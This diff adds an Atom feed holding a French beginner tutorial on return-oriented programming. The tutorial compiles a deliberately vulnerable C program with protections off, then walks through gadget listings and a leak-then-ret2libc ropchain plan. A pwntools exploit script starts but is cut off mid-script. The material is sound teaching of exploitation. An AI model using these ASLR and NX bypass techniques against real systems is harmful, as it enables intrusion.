@@ -1,0 +1,436 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Daily Security - Débutant</title><link href="https://www.dailysecurity.fr/" rel="alternate"></link><link href="https://www.dailysecurity.fr/tag/debutant/feed/index.xhtml" rel="self"></link><id>https://www.dailysecurity.fr/</id><updated>2017-09-02T02:09:00+02:00</updated><entry><title>Petit Manuel du ROP à l'usage des débutants</title><link href="https://www.dailysecurity.fr/return_oriented_programming" rel="alternate"></link><published>2017-09-02T02:09:00+02:00</published><updated>2017-09-02T02:09:00+02:00</updated><author><name>Geluchat</name></author><id>tag:www.dailysecurity.fr,2017-09-02:/return_oriented_programming</id><summary type="html">&lt;p&gt;&lt;img src="https://dailysecurity.fr/images/missme.gif" alt="Miss Me" style="width: 70%;"/&gt;&lt;/p&gt;
+&lt;h2&gt;De retour !&lt;/h2&gt;
+&lt;p&gt;Après plus d'un an d'absence sur le blog, je décide enfin d'écrire un &lt;a href="https://twitter.com/Geluchat/status/852894909497475072"&gt;article annoncé&lt;/a&gt; sur Twitter il y a déjà plusieurs mois. &lt;/p&gt;
+&lt;p&gt;Lorsque l'on débute dans le monde des exploits système, on se retrouve facilement bloqué lors de l'apprentissage du Return Oriented Programming (ROP).&lt;/p&gt;
+&lt;p&gt;Dans cet article …&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;img src="https://dailysecurity.fr/images/missme.gif" alt="Miss Me" style="width: 70%;"/&gt;&lt;/p&gt;
+&lt;h2&gt;De retour !&lt;/h2&gt;
+&lt;p&gt;Après plus d'un an d'absence sur le blog, je décide enfin d'écrire un &lt;a href="https://twitter.com/Geluchat/status/852894909497475072"&gt;article annoncé&lt;/a&gt; sur Twitter il y a déjà plusieurs mois. &lt;/p&gt;
+&lt;p&gt;Lorsque l'on débute dans le monde des exploits système, on se retrouve facilement bloqué lors de l'apprentissage du Return Oriented Programming (ROP).&lt;/p&gt;
+&lt;p&gt;Dans cet article, je vais vous expliquer une méthode de ROP qui fonctionne la plupart du temps et qui a l'avantage de ne pas utiliser &lt;em&gt;l'instruction int 0x80&lt;/em&gt; ; ce genre d'instruction étant souvent rare dans un binaire.&lt;/p&gt;
+&lt;h2&gt;Les prérequis (fortement recommandés) :&lt;/h2&gt;
+&lt;p&gt;Je vous conseille tout d'abord d'aller voir les deux articles de l'ami &lt;a href="https://twitter.com/hackanddo"&gt;hackndo&lt;/a&gt; disponibles &lt;a href="http://beta.hackndo.com/retour-a-la-libc/"&gt;ici&lt;/a&gt; et &lt;a href="http://beta.hackndo.com/return-oriented-programming/"&gt;ici&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Il y explique le fonctionnement des gadgets ainsi que les bases du ROP avec le ret2libc et l'instruction int 0x80 .&lt;/p&gt;
+&lt;p&gt;Pour aller plus loin sur les différentes utilisations des gadgets vous pouvez vous rendre sur le site de tosh qui contient un &lt;a href="https://github.com/t00sh/tosh-codes/blob/master/_posts/2013-08-26-rop-tricks-1.md"&gt;magnifique article sur les techniques de ROP&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;De plus, des bases sur le fonctionnement classique des buffer overflows sont obligatoires (sinon que faites vous sur cet article ?).&lt;/p&gt;
+&lt;h2&gt;Le ROP, c'est quoi ?&lt;/h2&gt;
+&lt;p&gt;Avant d'entrer dans le vif du sujet, nous allons revoir ensemble les principes du ROP.&lt;/p&gt;
+&lt;p&gt;Le ROP sert principalement à contourner la protection NX, celle-ci empêche l'utilisateur d’exécuter un shellcode en mappant la stack en non-executable (No-eXecutable).&lt;/p&gt;
+&lt;p&gt;Il permet aussi de participer à déjouer l'ALSR qui rend aléatoire la base de nos adresses dans la stack ainsi que dans la libc.&lt;/p&gt;
+&lt;p&gt;Afin d'exécuter notre code, on utilise alors des gadgets qui sont des morceaux de code présents dans les sections exécutables de notre binaire.&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://dailysecurity.fr/images/spectacular.gif" alt="Wtf" style="width: 50%;"/&gt;&lt;/p&gt;
+&lt;p&gt;Pour mieux comprendre l’intérêt et le fonctionnement du ROP, voyons l'étude de cas suivante :&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;testrop.c :&lt;/em&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;#include&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
+&lt;span class="cp"&gt;#include&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
+
+&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;vuln&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;64&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Input: &lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;scanf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%s&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;vuln&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Pour débuter, on compile en 32 bits :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ gcc testrop.c -fno-stack-protector -no-pie -m32 -o testrop
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Ici, le binaire est faillible via la fonction scanf() qui ne vérifie pas la taille de l'entrée.&lt;/p&gt;
+&lt;p&gt;Si vous aviez trouvé, bravo :&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://dailysecurity.fr/images/bravo.gif" alt="Bravo" style="width: 50%;"/&gt;&lt;/p&gt;
+&lt;p&gt;Regardons un peu les sections présentes dans notre binaire : &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ readelf -S testrop
+Il y a 30 en-têtes de section, débutant à l&amp;#39;adresse de décalage 0xf6c:
+
+En-têtes de section :
+  [Nr] Nom               Type            Adr      Décala.Taille ES Fan LN Inf Al
+  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
+  [ 1] .interp           PROGBITS        08048134 000134 000013 00   A  0   0  1
+  [ 2] .note.ABI-tag     NOTE            08048148 000148 000020 00   A  0   0  4
+  [ 3] .note.gnu.build-i NOTE            08048168 000168 000024 00   A  0   0  4
+  [ 4] .gnu.hash         GNU_HASH        0804818c 00018c 000020 04   A  5   0  4
+  [ 5] .dynsym           DYNSYM          080481ac 0001ac 000060 10   A  6   1  4
+  [ 6] .dynstr           STRTAB          0804820c 00020c 000063 00   A  0   0  1
+  [ 7] .gnu.version      VERSYM          08048270 000270 00000c 02   A  5   0  2
+  [ 8] .gnu.version_r    VERNEED         0804827c 00027c 000030 00   A  6   1  4
+  [ 9] .rel.dyn          REL             080482ac 0002ac 000008 08   A  5   0  4
+  [10] .rel.plt          REL             080482b4 0002b4 000020 08  AI  5  12  4
+  [11] .init             PROGBITS        080482d4 0002d4 000023 00  AX  0   0  4
+  [12] .plt              PROGBITS        08048300 000300 000050 04  AX  0   0 16
+  [13] .text             PROGBITS        08048350 000350 0001c2 00  AX  0   0 16
+  [14] .fini             PROGBITS        08048514 000514 000014 00  AX  0   0  4
+  [15] .rodata           PROGBITS        08048528 000528 000013 00   A  0   0  4
+  [16] .eh_frame_hdr     PROGBITS        0804853c 00053c 000034 00   A  0   0  4
+  [17] .eh_frame         PROGBITS        08048570 000570 0000dc 00   A  0   0  4
+  [18] .init_array       INIT_ARRAY      0804964c 00064c 000004 00  WA  0   0  4
+  [19] .fini_array       FINI_ARRAY      08049650 000650 000004 00  WA  0   0  4
+  [20] .jcr              PROGBITS        08049654 000654 000004 00  WA  0   0  4
+  [21] .dynamic          DYNAMIC         08049658 000658 0000e8 08  WA  6   0  4
+  [22] .got              PROGBITS        08049740 000740 000004 04  WA  0   0  4
+  [23] .got.plt          PROGBITS        08049744 000744 00001c 04  WA  0   0  4
+  [24] .data             PROGBITS        08049760 000760 000008 00  WA  0   0  4
+  [25] .bss              NOBITS          08049768 000768 000004 00  WA  0   0  1
+  [26] .comment          PROGBITS        00000000 000768 000039 01  MS  0   0  1
+  [27] .shstrtab         STRTAB          00000000 0007a1 000106 00      0   0  1
+  [28] .symtab           SYMTAB          00000000 0008a8 000450 10     29  45  4
+  [29] .strtab           STRTAB          00000000 000cf8 000271 00      0   0  1
+Clé des fanions :
+  W (écriture), A (allocation), X (exécution), M (fusion), S (chaînes)
+  I (info), L (ordre des liens), G (groupe), T (TLS), E (exclu), x (inconnu)
+  O (traitement additionnel requis pour l&amp;#39;OS) o (spécifique à l&amp;#39;OS), p (spécifique au processeur)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Ici on peut voir que les sections .init, .plt, .text et .fini ont le flag eXecutable, c'est donc ici que nous allons trouver nos gadgets.&lt;/p&gt;
+&lt;p&gt;Petit rappel sur les sections les plus importantes d'un binaire lorsque l'on souhaite faire du ROP :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;PLT : Contient du code permettant de résoudre les fonctions de la libc exécutées dans le binaire  (&lt;a href="http://www.segmentationfault.fr/linux/role-plt-got-ld-so/"&gt;Explication&lt;/a&gt;)&lt;/li&gt;
+&lt;li&gt;TEXT : Le code du binaire&lt;/li&gt;
+&lt;li&gt;GOT : Contient les adresses de la libc résolues grâce à la plt&lt;/li&gt;
+&lt;li&gt;BSS : Contient les variables statiques définies lors de la création du programme.&lt;/li&gt;
+&lt;li&gt;DATA : Contient les données variables étant définies lors de la création du programme. Par exemple : &lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;test&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Ma chaîne&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Après ce bref rappel sur le rôle des sections, voyons à quoi ressemble un gadget.
+Les gadgets ont, la plupart du temps, la forme suivante :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;instruction1; instruction2; instruction-n; ret
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;L'instruction "ret" en 32bits est l'équivalent d'un pop EIP : On enlève 4 bytes de la stack et on les met dans EIP.&lt;/p&gt;
+&lt;p&gt;Cela permet d'enchainer différents gadgets et de construire une suite d'actions que l'on appelle ropchain.&lt;/p&gt;
+&lt;p&gt;Le type de gadget le plus utilisé est le gadget "pop", il permet de mettre des chaînes de 4 bytes non exécutables sur la stack comme dans l'exemple suivant :&lt;/p&gt;
+&lt;p&gt;Exemple de ropchain située sur la stack :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;+----------------------------+
+|                            |
+|    pop ebx; pop ecx; ret;  |
+|                            |
++----------------------------+
+|                            |
+|         0x61616161         |
+|                            |
++----------------------------+
+|                            |
+|         0x62626262         |
+|                            |
++----------------------------+
+|                            |
+|       gadget suivant       |
+|                            |
++----------------------------+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Lors de l'exploitation, cette technique nous permettra par exemple de faire appel à des fonctions avec des arguments comme nous allons le voir dans la partie suivante.&lt;/p&gt;
+&lt;h2&gt;La méthode de ROP classique :&lt;/h2&gt;
+&lt;p&gt;Passons directement à la méthode d'exploitation. Nous allons utiliser le schéma d'exploitation suivant :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;ret2plt vers puts afin de leak (récupérer) une adresse de la libc (dont la base est aléatoire en raison de l'ASLR).&lt;/li&gt;
+&lt;li&gt;ret2main afin de ré-exécuter le programme sans recharger l'ALSR.&lt;/li&gt;
+&lt;li&gt;ret2libc vers &lt;em&gt;system&lt;/em&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src="https://dailysecurity.fr/images/wtf.gif" alt="Wtf" style="width: 50%;"/&gt;&lt;/p&gt;
+&lt;p&gt;Maintenant que vous êtes tous perdus, une petite explication s'impose :&lt;/p&gt;
+&lt;p&gt;C'est quoi tous ces ret2truc ?&lt;/p&gt;
+&lt;p&gt;Le &lt;strong&gt;ret2plt&lt;/strong&gt; est une méthode qui permet d’exécuter n'importe quelle fonction importée dans le binaire (via la PLT).&lt;/p&gt;
+&lt;p&gt;On peut les lister de la manière suivante :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ objdump -R testrop
+
+testrop:     format de fichier elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049740 R_386_GLOB_DAT    __gmon_start__
+08049750 R_386_JUMP_SLOT   puts
+08049754 R_386_JUMP_SLOT   __gmon_start__
+08049758 R_386_JUMP_SLOT   __libc_start_main
+0804975c R_386_JUMP_SLOT   __isoc99_scanf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Cette commande affiche les fonctions importées de la libc et leur adresse dans la GOT.&lt;/p&gt;
+&lt;p&gt;Dans notre schéma d'exploitation, nous avons parlé d'un ret2plt de puts.&lt;/p&gt;
+&lt;p&gt;Le but d'un ret2plt est d'exécuter une fonction de la libc présente dans le binaire.&lt;/p&gt;
+&lt;p&gt;Le modèle de ropchain pour faire un ret2plt est le suivant:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ropchain = addrPltFonction + popNgadgetRet + arg1 +...+ arg2
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Avec popNgadgetRet étant un gadget contenant autant de pop que d'arguments voulus : dans notre cas, un seul.&lt;/p&gt;
+&lt;p&gt;En effet, la fonction puts prend un argument qui est un pointeur vers une chaîne:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;puts&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;const&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;str&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Si cet argument pointe sur une adresse de la libc, nous pouvons alors l'afficher et la récupérer ! &lt;/p&gt;
+&lt;p&gt;Dans notre étude des sections importantes nous avons vu une section qui contient les adresses de la libc : la GOT !&lt;/p&gt;
+&lt;p&gt;On peut donc en conclure qu'un pointeur sur l'adresse de &lt;em&gt;scanf&lt;/em&gt; est disponible à l'adresse 0x804975c (voir la liste des fonctions ci-dessus).&lt;/p&gt;
+&lt;p&gt;Une simple vérification sous gdb nous confirme que l'adresse de &lt;em&gt;scanf&lt;/em&gt; est bien dans la GOT :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;gdb-peda$ x/x 0x0804975c
+0x804975c &amp;lt;__isoc99_scanf@got.plt&amp;gt;:     0xf7e77140
+gdb-peda$ x/x __isoc99_scanf
+0xf7e77140 &amp;lt;__isoc99_scanf&amp;gt;:    0x53565755
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Pour notre exploitation, il faut que notre début de ropchain exécute :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;puts(adresseGOTscanf);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;On récupère donc l'adresse référençant puts dans la plt (ici 0x8048310):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ objdump -d testrop | grep &amp;quot;&amp;lt;puts@plt&amp;gt;&amp;quot;
+08048310 &amp;lt;puts@plt&amp;gt;:
+ 8048459:       e8 b2 fe ff ff          call   8048310 &amp;lt;puts@plt&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Il faut aussi lui envoyer un argument à l'aide d'un pop XXX; ret.&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://github.com/JonathanSalwan/ROPgadget"&gt;RopGadget&lt;/a&gt; permet d'extraire les gadgets d'un binaire :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ ROPGadget --binary testrop
+Gadgets information
+============================================================
+0x08048623 : adc al, 0x41 ; ret
+0x0804843e : adc al, 0x50 ; call edx
+0x080483b7 : adc cl, cl ; ret
+0x0804848f : add al, 0x59 ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret
+0x08048418 : add al, 8 ; add ecx, ecx ; ret
+0x080483b1 : add al, 8 ; call eax
+0x080483eb : add al, 8 ; call edx
+0x080482f0 : add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
+0x08048620 : add cl, byte ptr [eax + 0xe] ; adc al, 0x41 ; ret
+0x0804861c : add eax, 0x2300e4e ; dec eax ; push cs ; adc al, 0x41 ; ret
+0x08048415 : add eax, 0x8049768 ; add ecx, ecx ; ret
+0x0804841a : add ecx, ecx ; ret
+0x080483b5 : add esp, 0x10 ; leave ; ret
+0x080484f9 : add esp, 0x1c ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+0x0804848d : add esp, 4 ; pop ecx ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret
+0x080482f2 : add esp, 8 ; pop ebx ; ret
+0x080482d8 : call 0x8048386
+0x080483b3 : call eax
+0x080483ed : call edx
+0x08048494 : cld ; ret
+0x08048621 : dec eax ; push cs ; adc al, 0x41 ; ret
+-----
+snip
+-----
+0x080483b2 : or bh, bh ; rol byte ptr [ebx - 0xc36ef3c], 1 ; ret
+0x080483ec : or bh, bh ; rol byte ptr [ebx - 0xc36ef3c], cl ; ret
+0x08048419 : or byte ptr [ecx], al ; leave ; ret
+0x08048491 : pop ebp ; lea esp, dword ptr [ecx - 4] ; ret
+0x080484ff : pop ebp ; ret
+0x080484fc : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+0x080482f5 : pop ebx ; ret
+0x08048490 : pop ecx ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret
+0x080484fe : pop edi ; pop ebp ; ret
+0x080484fd : pop esi ; pop edi ; pop ebp ; ret
+0x08048493 : popal ; cld ; ret
+0x08048416 : push 0x1080497 ; leave ; ret
+----
+snip
+----
+0x080483ea : xchg eax, edi ; add al, 8 ; call edx
+0x0804861f : xor byte ptr [edx], al ; dec eax ; push cs ; adc al, 0x41 ; ret
+
+Unique gadgets found: 87
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;On y trouve un gadget &lt;code&gt;0x080482f5 : pop ebx ; ret;&lt;/code&gt; idéal pour notre exploitation !&lt;/p&gt;
+&lt;p&gt;La deuxième partie du schéma indique l'utilisation d'un &lt;strong&gt;ret2main&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;Cela consiste tout simplement à mettre l'adresse du main du programme dans notre ropchain afin que celui-ci se relance sans modifier l'ALSR (l'ALSR change à chaque démarrage du programme).&lt;/p&gt;
+&lt;p&gt;Notre ropchain pour leak l'adresse de &lt;em&gt;scanf&lt;/em&gt; dans la libc aura donc cette forme :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;ropchain = addrPLTputs &lt;/span&gt;&lt;span class="nb"&gt;+&lt;/span&gt;&lt;span class="c"&gt; addrPopEbxRet &lt;/span&gt;&lt;span class="nb"&gt;+&lt;/span&gt;&lt;span class="c"&gt; addrGOTscanf &lt;/span&gt;&lt;span class="nb"&gt;+&lt;/span&gt;&lt;span class="c"&gt; addrMain&lt;/span&gt;
+
+&lt;span class="nb"&gt;+-----------------------------+&lt;/span&gt;&lt;span class="c"&gt;&lt;/span&gt;
+&lt;span class="c"&gt;|                             |&lt;/span&gt;
+&lt;span class="c"&gt;|    0x8048310 : &lt;/span&gt;&lt;span class="nv"&gt;&amp;lt;&lt;/span&gt;&lt;span class="c"&gt;puts@plt&lt;/span&gt;&lt;span class="nv"&gt;&amp;gt;&lt;/span&gt;&lt;span class="c"&gt;   |&lt;/span&gt;
+&lt;span class="c"&gt;|                             |&lt;/span&gt;
+&lt;span class="nb"&gt;+-----------------------------+&lt;/span&gt;&lt;span class="c"&gt;&lt;/span&gt;
+&lt;span class="c"&gt;|                             |&lt;/span&gt;
+&lt;span class="c"&gt;| 0x080482f5 : pop ebx ; ret; |&lt;/span&gt;
+&lt;span class="c"&gt;|                             |&lt;/span&gt;
+&lt;span class="nb"&gt;+-----------------------------+&lt;/span&gt;&lt;span class="c"&gt;&lt;/span&gt;
+&lt;span class="c"&gt;|                             |&lt;/span&gt;
+&lt;span class="c"&gt;| 0x804975c : __isoc99_scanf  |&lt;/span&gt;
+&lt;span class="c"&gt;|                             |&lt;/span&gt;
+&lt;span class="nb"&gt;+-----------------------------+&lt;/span&gt;&lt;span class="c"&gt;&lt;/span&gt;
+&lt;span class="c"&gt;|                             |&lt;/span&gt;
+&lt;span class="c"&gt;|      0x8048477 : &lt;/span&gt;&lt;span class="nv"&gt;&amp;lt;&lt;/span&gt;&lt;span class="c"&gt;main&lt;/span&gt;&lt;span class="nv"&gt;&amp;gt;&lt;/span&gt;&lt;span class="c"&gt;     |&lt;/span&gt;
+&lt;span class="c"&gt;|                             |&lt;/span&gt;
+&lt;span class="nb"&gt;+-----------------------------+&lt;/span&gt;&lt;span class="c"&gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;On teste donc avec le script suivant que notre début de ropchain fonctionne :&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Attention le script fonctionne avec la librairie &lt;a href="https://github.com/Gallopsled/pwntools"&gt;pwntools&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;
+&lt;span class="c1"&gt;# -*- coding: utf-8 -*-&lt;/span&gt;
+
+&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pwn&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
+
+
+&lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arch&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;i386&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
+&lt;span class="n"&gt;b&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ELF&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;./testrop&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;libc&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ELF&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/lib32/libc.so.6&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# &amp;quot;info sharedlibrary&amp;quot; sous gdb pour connaître le chemin de votre libc&lt;/span&gt;
+
+&lt;span class="n"&gt;DEBUG&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;False&lt;/span&gt;
+
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;wait&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;until&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvuntil&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;until&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;DEBUG&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+        &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;buf&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;buf&lt;/span&gt;
+
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;start&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
+    &lt;span class="k"&gt;global&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;libc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
